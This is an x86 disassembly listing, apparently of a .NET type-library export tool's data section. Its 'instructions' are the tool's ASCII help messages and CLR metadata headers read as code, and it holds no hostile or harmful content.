  405529:	and    BYTE PTR [eax],ah
  40552b:	and    BYTE PTR [eax],ah
  40552d:	and    BYTE PTR [eax],ah
  40552f:	and    BYTE PTR [eax],ah
  405531:	and    BYTE PTR [eax],ah
  405533:	and    BYTE PTR [eax],ah
  405535:	and    BYTE PTR [eax],ah
  405537:	and    BYTE PTR [eax],ah
  405539:	and    BYTE PTR [ebx+0x72],al
  40553c:	gs popa 
  40553e:	je     0x4055a5
  405540:	and    BYTE PTR [ecx+0x20],ah
  405543:	ss xor al,0x2d
  405546:	bound  ebp,QWORD PTR [ecx+0x74]
  405549:	and    BYTE PTR [ecx+edi*2+0x70],dh
  40554d:	and    BYTE PTR gs:[ecx+ebp*2+0x62],ch
  405552:	jb     0x4055b5
  405554:	jb     0x4055cf
  405556:	add    DWORD PTR [esi+0x20],eax
  405559:	and    BYTE PTR [eax],ah
  40555b:	and    BYTE PTR [edi],ch
  40555d:	outs   dx,DWORD PTR ds:[esi]
  40555e:	ins    BYTE PTR es:[edi],dx
  40555f:	outs   dx,BYTE PTR fs:[esi]
  405561:	popa   
  405562:	ins    DWORD PTR es:[edi],dx
  405563:	gs jae 0x405586
  405566:	and    BYTE PTR [eax],ah
  405568:	and    BYTE PTR [eax],ah
  40556a:	and    BYTE PTR [eax],ah
  40556c:	and    BYTE PTR [eax],ah
  40556e:	and    BYTE PTR [eax],ah
  405570:	and    BYTE PTR [eax],ah
  405572:	and    BYTE PTR [eax],ah
  405574:	and    BYTE PTR [eax],ah
  405576:	and    BYTE PTR [eax],ah
  405578:	inc    esp
  405579:	outs   dx,DWORD PTR ds:[esi]
  40557a:	and    BYTE PTR [esi+0x6f],ch
  40557d:	je     0x40559f
  40557f:	imul   esp,DWORD PTR [edi+0x6e],0x2065726f
  405586:	inc    ebx
  405587:	dec    edi
  405588:	dec    ebp
  405589:	and    BYTE PTR [ecx+0x6e],ch
  40558c:	jbe    0x4055f7
  40558e:	jae    0x4055f9
  405590:	bound  ebp,QWORD PTR [ebp+eiz*2+0x20]
  405594:	je     0x40560f
  405596:	jo     0x4055fd
  405598:	jae    0x4055ba
  40559a:	ja     0x405604
  40559c:	outs   dx,BYTE PTR gs:[esi]
  40559e:	add    DWORD PTR [eax+eiz*1],edi
  4055a1:	and    BYTE PTR [eax],ah
  4055a3:	and    BYTE PTR [eax],ah
  4055a5:	and    BYTE PTR [eax],ah
  4055a7:	and    BYTE PTR [eax],ah
  4055a9:	and    BYTE PTR [eax],ah
  4055ab:	and    BYTE PTR [eax],ah
  4055ad:	and    BYTE PTR [eax],ah
  4055af:	and    BYTE PTR [eax],ah
  4055b1:	and    BYTE PTR [eax],ah
  4055b3:	and    BYTE PTR [eax],ah
  4055b5:	and    BYTE PTR [eax],ah
  4055b7:	and    BYTE PTR [eax],ah
  4055b9:	and    BYTE PTR [eax],ah
  4055bb:	and    BYTE PTR [eax],ah
  4055bd:	and    BYTE PTR [eax],ah
  4055bf:	and    BYTE PTR [ebp+eiz*2+0x63],ah
  4055c3:	outs   dx,DWORD PTR ds:[esi]
  4055c4:	jb     0x405627
  4055c6:	je     0x405631
  4055c8:	outs   dx,BYTE PTR ds:[esi]
  4055c9:	and    BYTE PTR [bp+0x61],ch
  4055cd:	ins    DWORD PTR es:[edi],dx
  4055ce:	gs jae 0x4055f1
  4055d1:	sub    BYTE PTR [edi+0x6c],ch
  4055d4:	fs sub eax,0x656c7572
  4055da:	jae    0x405605
  4055dc:	add    DWORD PTR [eax+eiz*1+0x20],eax
  4055e0:	and    BYTE PTR [eax],ah
  4055e2:	das    
  4055e3:	outs   dx,BYTE PTR ds:[esi]
  4055e4:	outs   dx,DWORD PTR ds:[esi]
  4055e5:	ins    BYTE PTR es:[edi],dx
  4055e6:	outs   dx,DWORD PTR ds:[esi]
  4055e7:	outs   dx,DWORD PTR ds:[si]
  4055e9:	and    BYTE PTR [eax],ah
  4055eb:	and    BYTE PTR [eax],ah
  4055ed:	and    BYTE PTR [eax],ah
  4055ef:	and    BYTE PTR [eax],ah
  4055f1:	and    BYTE PTR [eax],ah
  4055f3:	and    BYTE PTR [eax],ah
  4055f5:	and    BYTE PTR [eax],ah
  4055f7:	and    BYTE PTR [eax],ah
  4055f9:	and    BYTE PTR [eax],ah
  4055fb:	and    BYTE PTR [eax],ah
  4055fd:	and    BYTE PTR [eax+0x72],dl
  405600:	gs jbe 0x405668
  405603:	outs   dx,BYTE PTR ds:[esi]
  405604:	je     0x405679
  405606:	and    BYTE PTR [esp+ebp*2+0x62],dl
  40560a:	inc    ebp
  40560b:	js     0x40567d
  40560d:	and    BYTE PTR [esi+0x72],ah
  405610:	outs   dx,DWORD PTR ds:[esi]
  405611:	ins    DWORD PTR es:[edi],dx
  405612:	and    BYTE PTR [ecx+ebp*2+0x73],ah
  405616:	jo     0x405684
  405618:	popa   
  405619:	jns    0x405684
  40561b:	outs   dx,BYTE PTR ds:[esi]
  40561c:	and    BYTE PTR [si+0x6f],ch
  405620:	outs   dx,DWORD PTR ds:[si]
  405622:	add    DWORD PTR [edi+0x20],eax
  405625:	and    BYTE PTR [eax],ah
  405627:	and    BYTE PTR [edi],ch
  405629:	jae    0x405694
  40562b:	ins    BYTE PTR es:[edi],dx
  40562c:	outs   dx,BYTE PTR gs:[esi]
  40562e:	je     0x405650
  405630:	and    BYTE PTR [eax],ah
  405632:	and    BYTE PTR [eax],ah
  405634:	and    BYTE PTR [eax],ah
  405636:	and    BYTE PTR [eax],ah
  405638:	and    BYTE PTR [eax],ah
  40563a:	and    BYTE PTR [eax],ah
  40563c:	and    BYTE PTR [eax],ah
  40563e:	and    BYTE PTR [eax],ah
  405640:	and    BYTE PTR [eax],ah
  405642:	and    BYTE PTR [eax],ah
  405644:	push   ebx
  405645:	jne    0x4056b7
  405647:	jo     0x4056bb
  405649:	gs jae 0x4056bf
  40564c:	gs jae 0x40566f
  40564f:	popa   
  405650:	ins    BYTE PTR es:[edi],dx
  405651:	ins    BYTE PTR es:[edi],dx
  405652:	and    BYTE PTR [edi+0x75],ch
  405655:	je     0x4056c7
  405657:	jne    0x4056cd
  405659:	and    BYTE PTR [ebp+0x78],ah
  40565c:	arpl   WORD PTR [ebp+0x70],sp
  40565f:	je     0x405681
  405661:	outs   dx,WORD PTR ds:[esi]
  405663:	jb     0x405685
  405665:	gs jb  0x4056da
  405668:	outs   dx,DWORD PTR ds:[esi]
  405669:	jb     0x4056de
  40566b:	add    DWORD PTR [edx],edi
  40566d:	and    BYTE PTR [eax],ah
  40566f:	and    BYTE PTR [eax],ah
  405671:	das    
  405672:	jbe    0x4056d9
  405674:	jb     0x4056d8
  405676:	outs   dx,DWORD PTR ds:[esi]
  405677:	jae    0x4056de
  405679:	and    BYTE PTR [eax],ah
  40567b:	and    BYTE PTR [eax],ah
  40567d:	and    BYTE PTR [eax],ah
  40567f:	and    BYTE PTR [eax],ah
  405681:	and    BYTE PTR [eax],ah
  405683:	and    BYTE PTR [eax],ah
  405685:	and    BYTE PTR [eax],ah
  405687:	and    BYTE PTR [eax],ah
  405689:	and    BYTE PTR [eax],ah
  40568b:	and    BYTE PTR [eax],ah
  40568d:	inc    esp
  40568e:	imul   esi,DWORD PTR [ebx+0x70],0x7379616c
  405695:	and    BYTE PTR [ebp+0x78],ah
  405698:	je     0x40570c
  40569a:	popa   
  40569b:	and    BYTE PTR [ecx+0x6e],ch
  40569e:	outs   dx,WORD PTR ds:[esi]
  4056a0:	jb     0x40570f
  4056a2:	popa   
  4056a3:	je     0x40570e
  4056a5:	outs   dx,DWORD PTR ds:[esi]
  4056a6:	outs   dx,BYTE PTR ds:[esi]
  4056a7:	add    DWORD PTR [edi+0x20],eax
  4056aa:	and    BYTE PTR [eax],ah
  4056ac:	and    BYTE PTR [edi],ch
  4056ae:	outs   dx,BYTE PTR ds:[esi]
  4056af:	popa   
  4056b0:	ins    DWORD PTR es:[edi],dx
  4056b1:	gs jae 0x4056ee
  4056b4:	inc    esi
  4056b5:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x20656d61
  4056bd:	and    BYTE PTR [eax],ah
  4056bf:	and    BYTE PTR [eax],ah
  4056c1:	and    BYTE PTR [eax],ah
  4056c3:	and    BYTE PTR [eax],ah
  4056c5:	and    BYTE PTR [eax],ah
  4056c7:	and    BYTE PTR [eax],ah
  4056c9:	inc    ecx
  4056ca:	and    BYTE PTR [esi+0x69],ah
  4056cd:	ins    BYTE PTR es:[edi],dx
  4056ce:	and    BYTE PTR gs:[ecx+0x6e],ch
  4056d2:	and    BYTE PTR [edi+0x68],dh
  4056d5:	imul   esp,DWORD PTR [ebx+0x68],0x63616520
  4056dc:	push   0x6e696c20
  4056e1:	and    BYTE PTR gs:[ebx+0x70],dh
  4056e5:	arpl   WORD PTR gs:[ecx+0x66],bp
  4056e9:	imul   esp,DWORD PTR [ebp+0x73],0x65687420
  4056f0:	add    DWORD PTR [ebp+0x20],ecx
  4056f3:	and    BYTE PTR [eax],ah
  4056f5:	and    BYTE PTR [eax],ah
  4056f7:	and    BYTE PTR [eax],ah
  4056f9:	and    BYTE PTR [eax],ah
  4056fb:	and    BYTE PTR [eax],ah
  4056fd:	and    BYTE PTR [eax],ah
  4056ff:	and    BYTE PTR [eax],ah
  405701:	and    BYTE PTR [eax],ah
  405703:	and    BYTE PTR [eax],ah
  405705:	and    BYTE PTR [eax],ah
  405707:	and    BYTE PTR [eax],ah
  405709:	and    BYTE PTR [eax],ah
  40570b:	and    BYTE PTR [eax],ah
  40570d:	and    BYTE PTR [eax],ah
  40570f:	and    BYTE PTR [eax],ah
  405711:	and    BYTE PTR [ebx+0x61],ah
  405714:	jo     0x40577f
  405716:	je     0x405779
  405718:	ins    BYTE PTR es:[edi],dx
  405719:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  405720:	and    BYTE PTR [edi+0x66],ch
  405723:	and    BYTE PTR [ecx+0x20],ah
  405726:	outs   dx,BYTE PTR ds:[esi]
  405727:	popa   
  405728:	ins    DWORD PTR es:[edi],dx
  405729:	and    BYTE PTR gs:[ecx+0x6e],ch
  40572d:	and    BYTE PTR [eax+ebp*2+0x65],dh
  405731:	and    BYTE PTR [ecx+edi*2+0x70],dh
  405735:	and    BYTE PTR gs:[ecx+ebp*2+0x62],ch
  40573a:	jb     0x40579d
  40573c:	jb     0x4057b7
  40573e:	add    DWORD PTR cs:[edx],edi
  405741:	and    BYTE PTR [eax],ah
  405743:	and    BYTE PTR [eax],ah
  405745:	das    
  405746:	aas    
  405747:	and    BYTE PTR [edi+0x72],ch
  40574a:	and    BYTE PTR [edi],ch
  40574c:	push   0x20706c65
  405751:	and    BYTE PTR [eax],ah
  405753:	and    BYTE PTR [eax],ah
  405755:	and    BYTE PTR [eax],ah
  405757:	and    BYTE PTR [eax],ah
  405759:	and    BYTE PTR [eax],ah
  40575b:	and    BYTE PTR [eax],ah
  40575d:	and    BYTE PTR [eax],ah
  40575f:	and    BYTE PTR [eax],ah
  405761:	inc    esp
  405762:	imul   esi,DWORD PTR [ebx+0x70],0x2079616c
  405769:	je     0x4057d3
  40576b:	imul   esi,DWORD PTR [ebx+0x20],0x67617375
  405772:	and    BYTE PTR gs:[ebp+0x65],ch
  405776:	jae    0x4057eb
  405778:	popa   
  405779:	add    DWORD PTR gs:[bx+di+0x54],esp
  40577e:	jns    0x4057f0
  405780:	and    BYTE PTR gs:[ecx+ebp*2+0x62],ch
  405785:	jb     0x4057e8
  405787:	jb     0x405802
  405789:	and    BYTE PTR [ecx+0x73],ch
  40578c:	and    BYTE PTR [edx+0x65],ah
  40578f:	imul   ebp,DWORD PTR [esi+0x67],0x70786520
  405796:	outs   dx,DWORD PTR ds:[esi]
  405797:	jb     0x40580d
  405799:	gs and BYTE PTR fs:[esi+0x6f],ah
  40579e:	jb     0x4057c0
  4057a0:	popa   
  4057a1:	jae    0x405816
  4057a3:	gs ins DWORD PTR es:[edi],dx
  4057a5:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  4057a9:	daa    
  4057aa:	jnp    0x4057dc
  4057ac:	jge    0x4057d5
  4057ae:	and    BYTE PTR [edi+0x68],dh
  4057b1:	imul   esp,DWORD PTR [ebx+0x68],0x726c6120
  4057b8:	gs popa 
  4057ba:	fs jns 0x4057dd
  4057bd:	arpl   WORD PTR [edi+0x6e],bp
  4057c0:	je     0x405823
  4057c2:	imul   ebp,DWORD PTR [esi+0x73],0x206e6120
  4057c9:	gs ins DWORD PTR es:[edi],dx
  4057cb:	bound  esp,QWORD PTR [ebp+0x64]
  4057ce:	fs gs and BYTE PTR fs:[ecx+edi*2+0x70],dh
  4057d5:	and    BYTE PTR gs:[ecx+ebp*2+0x62],ch
  4057da:	jb     0x40583d
  4057dc:	jb     0x405857
  4057de:	add    DWORD PTR [esi+0x65685701],edx
  4057e4:	outs   dx,BYTE PTR ds:[esi]
  4057e5:	and    BYTE PTR [ebx+0x72],ah
  4057e8:	outs   dx,DWORD PTR ds:[esi]
  4057e9:	jae    0x40585e
  4057eb:	sub    eax,0x706d6f63
  4057f0:	imul   ebp,DWORD PTR [ecx+ebp*2+0x6e],0x61202c67
  4057f8:	ins    BYTE PTR es:[edi],dx
  4057f9:	ins    BYTE PTR es:[edi],dx
  4057fa:	and    BYTE PTR [ecx+edi*2+0x70],dh
  4057fe:	and    BYTE PTR gs:[ecx+ebp*2+0x62],ch
  405803:	jb     0x405866
  405805:	jb     0x405880
  405807:	and    BYTE PTR [edx+0x65],dh
  40580a:	data16 gs jb 0x405873
  40580e:	outs   dx,BYTE PTR ds:[esi]
  40580f:	arpl   WORD PTR [ebp+0x73],sp
  405812:	and    BYTE PTR [ebx+0x68],dh
  405815:	outs   dx,DWORD PTR ds:[esi]
  405816:	jne    0x405884
  405818:	and    BYTE PTR fs:[edx+0x65],ah
  40581c:	and    BYTE PTR [ecx+0x6e],ch
  40581f:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  405823:	gs and BYTE PTR fs:[edi+0x6e],ch
  405828:	and    BYTE PTR [eax+ebp*2+0x65],dh
  40582c:	and    BYTE PTR [ebx+0x6f],ah
  40582f:	ins    DWORD PTR es:[edi],dx
  405830:	ins    DWORD PTR es:[edi],dx
  405831:	popa   
  405832:	outs   dx,BYTE PTR ds:[esi]
  405833:	and    BYTE PTR fs:[ecx+ebp*2+0x6e],ch
  405838:	and    BYTE PTR gs:[edi+ebp*2+0x20],dh
  40583d:	outs   dx,BYTE PTR gs:[esi]
  40583f:	jae    0x4058b6
  405841:	jb     0x4058a8
  405843:	and    BYTE PTR [eax+ebp*2+0x65],dh
  405847:	and    BYTE PTR [ebx+0x6f],ah
  40584a:	jb     0x4058be
  40584c:	arpl   WORD PTR gs:[eax+eiz*1+0x62],si
  405851:	imul   esi,DWORD PTR [ebp+ebp*1+0x73],0x69636570
  405859:	imul   sp,WORD PTR [ebx+0x20],0x7974
  40585f:	jo     0x4058c6
  405861:	and    BYTE PTR [ecx+ebp*2+0x62],ch
  405865:	jb     0x4058c8
  405867:	jb     0x4058d2
  405869:	gs jae 0x40588c
  40586c:	popa   
  40586d:	jb     0x4058d4
  40586f:	and    BYTE PTR [edi+ebp*2+0x61],ch
  405873:	fs gs fs add DWORD PTR cs:[edi+0x72655002],edx
  40587d:	outs   dx,WORD PTR ds:[esi]
  40587f:	jb     0x4058ee
  405881:	imul   ebp,DWORD PTR [esi+0x67],0x6f726320
  405888:	jae    0x4058fd
  40588a:	sub    eax,0x706d6f63
  40588f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x20],0x3320666f
  405897:	xor    ch,BYTE PTR ds:0x20746962
  40589d:	outs   dx,BYTE PTR ds:[esi]
  40589e:	outs   dx,DWORD PTR ds:[esi]
  40589f:	outs   dx,BYTE PTR ds:[esi]
  4058a0:	sub    eax,0x6f6e6761
  4058a5:	jae    0x40591b
  4058a7:	imul   esp,DWORD PTR [ebx+0x20],0x65737361
  4058ae:	ins    DWORD PTR es:[edi],dx
  4058af:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  4058b3:	je     0x405924
  4058b5:	and    BYTE PTR [esi],dh
  4058b7:	xor    al,0x2d
  4058b9:	bound  ebp,QWORD PTR [ecx+0x74]
  4058bc:	and    BYTE PTR [ecx+edi*2+0x70],dh
  4058c0:	and    BYTE PTR gs:[ecx+ebp*2+0x62],ch
  4058c5:	jb     0x405928
  4058c7:	jb     0x405942
  4058c9:	and    BYTE PTR [edi+0x72],ch
  4058cc:	and    BYTE PTR [esi],dh
  4058ce:	xor    al,0x2d
  4058d0:	bound  ebp,QWORD PTR [ecx+0x74]
  4058d3:	and    BYTE PTR [esi+0x6f],ch
  4058d6:	outs   dx,BYTE PTR ds:[esi]
  4058d7:	sub    eax,0x6f6e6761
  4058dc:	jae    0x405952
  4058de:	imul   esp,DWORD PTR [ebx+0x20],0x65737361
  4058e5:	ins    DWORD PTR es:[edi],dx
  4058e6:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  4058ea:	je     0x40595b
  4058ec:	and    BYTE PTR [ebx],dh
  4058ee:	xor    ch,BYTE PTR ds:0x20746962
  4058f4:	je     0x40596f
  4058f6:	jo     0x40595d
  4058f8:	and    BYTE PTR [ecx+ebp*2+0x62],ch
  4058fc:	jb     0x40595f
  4058fe:	jb     0x405979
  405900:	and    BYTE PTR cs:[eax],ah
  405903:	push   esp
  405904:	push   0x69207369
  405909:	jae    0x40592b
  40590b:	fs popa 
  40590d:	outs   dx,BYTE PTR ds:[esi]
  40590e:	addr16 gs jb 0x405981
  405912:	jne    0x405987
  405914:	and    BYTE PTR [ecx+0x73],ah
  405917:	and    BYTE PTR [eax+0x6f],dh
  40591a:	imul   ebp,DWORD PTR [esi+0x74],0x73207265
  405921:	imul   edi,DWORD PTR [edx+0x65],0x6e612073
  405928:	and    BYTE PTR fs:[eax+0x72],dh
  40592c:	outs   dx,DWORD PTR ds:[esi]
  40592d:	arpl   WORD PTR [ebp+0x73],sp
  405930:	jae    0x4059a1
  405932:	jb     0x405954
  405934:	fs gs jo 0x40599d
  405938:	outs   dx,BYTE PTR ds:[esi]
  405939:	fs outs dx,BYTE PTR gs:[esi]
  40593c:	arpl   WORD PTR [ebp+0x20],sp
  40593f:	ja     0x4059aa
  405941:	ins    BYTE PTR es:[edi],dx
  405942:	ins    BYTE PTR es:[edi],dx
  405943:	and    BYTE PTR [ecx+ebp*2+0x6b],ch
  405947:	gs ins BYTE PTR es:[edi],dx
  405949:	jns    0x40596b
  40594b:	arpl   WORD PTR [ecx+0x75],sp
  40594e:	jae    0x4059b5
  405950:	and    BYTE PTR [ecx+0x6e],ch
  405953:	arpl   WORD PTR [edi+0x6d],bp
  405956:	jo     0x4059b9
  405958:	je     0x4059c3
  40595a:	bound  ebp,QWORD PTR [ecx+0x6c]
  40595d:	imul   esi,DWORD PTR [ecx+edi*2+0x20],0x77746562
  405965:	gs outs dx,BYTE PTR gs:[esi]
  405968:	and    BYTE PTR [eax+ebp*2+0x65],dh
  40596c:	and    BYTE PTR [ecx+0x73],ah
  40596f:	jae    0x4059d6
  405971:	ins    DWORD PTR es:[edi],dx
  405972:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  405976:	popa   
  405977:	outs   dx,BYTE PTR ds:[esi]
  405978:	and    BYTE PTR fs:[edx+0x65],dh
  40597c:	jae    0x4059f3
  40597e:	ins    BYTE PTR es:[edi],dx
  40597f:	je     0x4059e2
  405981:	outs   dx,BYTE PTR ds:[esi]
  405982:	je     0x4059a4
  405984:	je     0x4059ff
  405986:	jo     0x4059ed
  405988:	and    BYTE PTR [ecx+ebp*2+0x62],ch
  40598c:	jb     0x4059ef
  40598e:	jb     0x405a09
  405990:	add    BYTE PTR cs:[eax],al
  405993:	add    BYTE PTR [edx+0x53],al
  405996:	dec    edx
  405997:	inc    edx
  405998:	add    DWORD PTR [eax],eax
  40599a:	add    DWORD PTR [eax],eax
  40599c:	add    BYTE PTR [eax],al
  40599e:	add    BYTE PTR [eax],al
  4059a0:	or     al,0x0
  4059a2:	add    BYTE PTR [eax],al
  4059a4:	jbe    0x4059d8
  4059a6:	xor    BYTE PTR cs:[esi],ch
  4059a9:	xor    eax,0x37323730
  4059ae:	add    BYTE PTR [eax],al
  4059b0:	add    BYTE PTR [eax],al
  4059b2:	add    eax,0x6c00
  4059b7:	add    BYTE PTR [eax],al
  4059b9:	push   ss
  4059ba:	add    BYTE PTR [eax],al
  4059bc:	and    edi,DWORD PTR [esi+0x0]
  4059bf:	add    BYTE PTR [esi+edx*1+0x0],ch
  4059c3:	add    BYTE PTR [eax+ebx*1+0x0],bh
  4059c7:	add    BYTE PTR [ebx],ah
  4059c9:	push   ebx
  4059ca:	je     0x405a3e
  4059cc:	imul   ebp,DWORD PTR [esi+0x67],0x73
  4059d3:	add    al,ch
  4059d5:	add    BYTE PTR cs:[eax],al
  4059d8:	lods   al,BYTE PTR ds:[esi]
  4059d9:	or     DWORD PTR [eax],eax
  4059db:	add    BYTE PTR [ebx],ah
  4059dd:	push   ebp
  4059de:	push   ebx
  4059df:	add    BYTE PTR [eax+edi*1+0x100000],dl
  4059e6:	add    BYTE PTR [eax],al
  4059e8:	and    eax,DWORD PTR [edi+0x55]
  4059eb:	dec    ecx
  4059ec:	inc    esp
  4059ed:	add    BYTE PTR [eax],al
  4059ef:	add    BYTE PTR [eax+edi*1+0x2a040000],ah
  4059f6:	add    BYTE PTR [eax],al
  4059f8:	and    eax,DWORD PTR [edx+0x6c]
  4059fb:	outs   dx,DWORD PTR ds:[esi]
  4059fc:	bound  eax,QWORD PTR [eax]
  4059fe:	add    BYTE PTR [eax],al
  405a00:	add    BYTE PTR [eax],al
  405a02:	add    BYTE PTR [eax],al
  405a04:	add    al,BYTE PTR [eax]
  405a06:	add    BYTE PTR [ecx],al
  405a08:	push   edi
  405a09:	pop    ds
  405a0a:	mov    ds:0x10915,al
  405a0f:	add    BYTE PTR [eax],al
  405a11:	cli    
  405a12:	add    DWORD PTR [ebx],esi
  405a14:	add    BYTE PTR [esi],dl
  405a16:	add    BYTE PTR [eax],al
  405a18:	add    DWORD PTR [eax],eax
  405a1a:	add    BYTE PTR [eax],al
  405a1c:	pop    ebx
  405a1d:	add    BYTE PTR [eax],al
  405a1f:	add    BYTE PTR [edi],dl
  405a21:	add    BYTE PTR [eax],al
  405a23:	add    BYTE PTR [edx+0x0],ch
  405a26:	add    BYTE PTR [eax],al
  405a28:	bound  eax,QWORD PTR [eax]
  405a2a:	add    BYTE PTR [eax],al
  405a2c:	sahf   
  405a2d:	add    BYTE PTR [eax],al
  405a2f:	add    BYTE PTR [ebx],al
  405a31:	add    BYTE PTR [eax],al
  405a33:	add    BYTE PTR [edx+0x48000000],cl
  405a39:	add    BYTE PTR [eax],al
  405a3b:	add    BYTE PTR ds:0x1a000000,dl
  405a41:	add    BYTE PTR [eax],al
  405a43:	add    BYTE PTR [eax+eax*1],al
  405a46:	add    BYTE PTR [eax],al
  405a48:	or     DWORD PTR [eax],eax
  405a4a:	add    BYTE PTR [eax],al
  405a4c:	or     al,BYTE PTR [eax]
  405a4e:	add    BYTE PTR [eax],al
  405a50:	add    eax,DWORD PTR [eax]
  405a52:	add    BYTE PTR [eax],al
  405a54:	pop    es
  405a55:	add    BYTE PTR [eax],al
  405a57:	add    BYTE PTR [ecx],al
  405a59:	add    BYTE PTR [eax],al
  405a5b:	add    BYTE PTR [ecx],al
  405a5d:	add    BYTE PTR [eax],al
  405a5f:	add    BYTE PTR [ecx],al
  405a61:	add    BYTE PTR [eax],al
  405a63:	add    BYTE PTR [eax],al
  405a65:	add    BYTE PTR [edx],cl
  405a67:	add    BYTE PTR [ecx],al
  405a69:	add    BYTE PTR [eax],al
  405a6b:	add    BYTE PTR [eax],al
  405a6d:	add    BYTE PTR [esi],al
  405a6f:	add    BYTE PTR [edi],dh
  405a71:	add    DWORD PTR [eax],esi
  405a73:	add    DWORD PTR [esi],eax
  405a75:	add    BYTE PTR [esi],bh
  405a77:	add    DWORD PTR [eax],esi
  405a79:	add    DWORD PTR [esi],eax
  405a7b:	add    BYTE PTR [ecx+0x1],dl
  405a7e:	xor    BYTE PTR [ecx],al
  405a80:	push   es
  405a81:	add    BYTE PTR [ebp+0x1],dh
  405a84:	push   esi
  405a85:	add    DWORD PTR [esi],eax
  405a87:	add    BYTE PTR [eax+0x6015601],dl
  405a8d:	add    BYTE PTR [esi+eax*1],ah
  405a90:	adc    eax,DWORD PTR [esi]
  405a92:	push   es
  405a93:	add    BYTE PTR [edi+eax*1],cl
  405a96:	add    BYTE PTR [edi],al
  405a98:	push   es
  405a99:	add    BYTE PTR ds:0x6015608,ch
  405a9f:	add    BYTE PTR [eax+ecx*1+0x60130],ch
  405aa6:	push   0x6094009
  405aab:	add    BYTE PTR [ebx+0x609a109],dh
  405ab1:	add    BYTE PTR [ebx+0xa],dl
  405ab4:	xor    BYTE PTR [ecx],al
  405ab6:	push   es
  405ab7:	add    BYTE PTR [edi+0x60aa40a],dh
  405abd:	add    dh,dh
  405abf:	or     dh,BYTE PTR [eax]
  405ac1:	add    DWORD PTR [esi],eax
  405ac3:	add    BYTE PTR [eax+0x601560b],dl
  405ac9:	add    BYTE PTR [ebp+0xd],cl
  405acc:	push   esi
  405acd:	add    DWORD PTR [esi],eax
  405acf:	add    BYTE PTR [ebx],dh
  405ad1:	orps   xmm0,XMMWORD PTR [ecx]
  405ad4:	push   es
  405ad5:	add    BYTE PTR [edi+0xf],al
  405ad8:	xor    BYTE PTR [ecx],al
  405ada:	push   es
  405adb:	add    BYTE PTR [ebp+0xf],bl
  405ade:	mov    eax,ds:0x74000609
  405ae3:	pop    fs
  405ae5:	or     DWORD PTR [esi],eax
  405ae7:	add    BYTE PTR [ecx+0x609a10f],dl
  405aed:	add    BYTE PTR [edi+0x609a10f],ch
  405af3:	add    al,cl
  405af5:	pop    fs
  405af7:	or     DWORD PTR [esi],eax
  405af9:	add    cl,ah
  405afb:	pop    fs
  405afd:	or     DWORD PTR [esi],eax
  405aff:	add    ah,bh
  405b01:	pop    fs
  405b03:	or     DWORD PTR [esi],eax
  405b05:	add    BYTE PTR ds:0x609a110,dl
  405b0b:	add    BYTE PTR [edx],dh
  405b0d:	adc    BYTE PTR [ecx+0x58000609],ah
  405b13:	adc    BYTE PTR [ebx],dl
  405b15:	push   es
  405b16:	push   es
  405b17:	add    BYTE PTR [edx+0x10],bh
  405b1a:	adc    eax,DWORD PTR [esi]
  405b1c:	push   es
  405b1d:	add    BYTE PTR [eax+edx*1+0x609a1],bl
  405b24:	mov    bh,0x10
  405b26:	mov    eax,ds:0xe3000609
  405b2b:	adc    al,dl
  405b2d:	adc    BYTE PTR [ebx+0x10f700],al
  405b33:	add    BYTE PTR [esi],al
  405b35:	add    BYTE PTR [esi],ah
  405b37:	adc    DWORD PTR [esi],eax
  405b39:	adc    DWORD PTR [esi],eax
  405b3b:	add    BYTE PTR [esi+0x11],al
  405b3e:	push   es
  405b3f:	adc    DWORD PTR [esi],eax
  405b41:	add    BYTE PTR [ecx+edx*1+0x30],ah
  405b45:	add    DWORD PTR [esi],eax
  405b47:	add    BYTE PTR [ecx+0x11],ch
  405b4a:	xor    BYTE PTR [ecx],al
  405b4c:	push   es
  405b4d:	add    BYTE PTR [ecx+0x6013011],bl
  405b53:	add    BYTE PTR [edi+0x6013011],ah
  405b59:	add    cl,dl
  405b5b:	adc    DWORD PTR [ecx+edx*1+0x11ee0006],edi
  405b62:	in     al,0x11
  405b64:	push   es
  405b65:	add    bh,dh
  405b67:	adc    esp,esp
  405b69:	adc    DWORD PTR [esi],eax
  405b6b:	add    BYTE PTR [eax],dh
  405b6d:	adc    ah,ah
  405b6f:	adc    DWORD PTR [esi],eax
  405b71:	add    BYTE PTR [esi+0x12],al
  405b74:	in     al,0x11
  405b76:	push   es
  405b77:	add    BYTE PTR [edi+0x12],dl
  405b7a:	in     al,0x11
  405b7c:	push   es
  405b7d:	add    BYTE PTR [ebp+0x12],dh
  405b80:	xor    BYTE PTR [ecx],al
  405b82:	push   es
  405b83:	add    BYTE PTR [esi+0x6013012],dh
  405b89:	add    cl,bl
  405b8b:	adc    dh,BYTE PTR [eax]
  405b8d:	add    DWORD PTR [esi],eax
  405b8f:	add    dl,bh
  405b91:	adc    ah,bl
  405b93:	adc    al,BYTE PTR [esi]
  405b95:	add    BYTE PTR ds:0x609a113,bl
  405b9b:	add    BYTE PTR [edi+0x13],dl
  405b9e:	aas    
  405b9f:	adc    eax,DWORD PTR [esi]
  405ba1:	add    BYTE PTR [ebx+0x613a213],dh
  405ba7:	add    BYTE PTR [edx],dl
  405ba9:	adc    al,0x30
  405bab:	add    DWORD PTR [esi],eax
  405bad:	add    BYTE PTR [eax],dh
  405baf:	adc    al,0x30
  405bb1:	add    DWORD PTR [esi],eax
  405bb3:	add    BYTE PTR [eax+0x14],cl
  405bb6:	xor    BYTE PTR [ecx],al
  405bb8:	push   es
  405bb9:	add    BYTE PTR [eax+0x14],dl
  405bbc:	add    BYTE PTR [edi],al
  405bbe:	push   es
  405bbf:	add    BYTE PTR [ecx+0x14],bh
  405bc2:	mov    esp,0xb0000611
  405bc7:	adc    al,0xe4
  405bc9:	adc    DWORD PTR [esi],eax
  405bcb:	add    dl,al
  405bcd:	adc    al,0x30
  405bcf:	add    DWORD PTR [esi],eax
  405bd1:	add    ch,cl
  405bd3:	adc    al,0x30
  405bd5:	add    DWORD PTR [esi],eax
  405bd7:	add    bl,dl
  405bd9:	adc    al,0x56
  405bdb:	add    DWORD PTR [esi],eax
  405bdd:	add    dl,bh
  405bdf:	adc    al,0x30
  405be1:	add    DWORD PTR [esi],eax
  405be3:	add    BYTE PTR [edx],ch
  405be5:	adc    eax,0x60130
  405bea:	pusha  
